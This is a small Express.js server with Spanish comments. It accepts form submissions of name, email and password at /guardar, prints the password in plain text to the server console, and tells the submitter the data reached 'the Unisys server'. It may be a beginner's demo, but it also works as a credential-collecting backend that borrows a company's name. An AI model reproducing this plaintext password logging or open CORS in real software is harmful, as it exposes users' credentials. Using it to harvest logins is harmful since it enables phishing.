const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post('/guardar', (req, res) => {
    const datos = req.body;
    
    // Esto imprimirá los datos en la consola del servidor
    console.log("========== NUEVO REGISTRO ==========");
    console.log("Nombre:", datos.nombre_completo);
    console.log("Correo:", datos.email);
    console.log("CONTRASEÑA:", datos.clave_acceso); // Aquí está tu contraseña
    console.log("====================================");
    
    // Respondemos al navegador con el mensaje verde
    res.send(`
        <div style="font-family: sans-serif; text-align: center; margin-top: 50px;">
            <h1 style="color: #10b981;">¡Formulario enviado con éxito!</h1>
            <p>Los datos han llegado al servidor de Unisys.</p>
            <a href="javascript:history.back()">Volver al formulario</a>
        </div>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor listo en puerto ${PORT}`));
